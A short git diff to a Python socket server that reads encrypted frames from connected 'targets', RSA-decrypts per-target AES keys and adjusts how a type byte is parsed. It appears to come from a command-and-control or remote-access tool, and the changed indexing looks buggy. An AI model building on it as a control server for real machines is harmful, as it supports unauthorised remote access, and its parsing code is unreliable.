@@ -136,12 +136,15 @@ def server():
                     # print(length_bytes)
                     if len(length_bytes) >= 5:
                         length = struct.unpack("<I", length_bytes[:4])[0] #error when target is disconnected
+                        type_byte = length_bytes[5]
+                    else:
+                        type_byte = 0x00
                     frame = elem.recv(length)
                     
                     
                     
 
-                    type_byte = frame[0]
+                    
                     ciphertext = frame[1:]
                     plaintext = ""
 
@@ -149,6 +152,8 @@ def server():
 
 
                     match type_byte:
+                        case 0x00:
+                            print("error in importation")
                         case 0x01:
                             aes_key = rsa_decryption(private_key, ciphertext)
                             dict_ip[nom_cible] = (elem, True, aes_key)
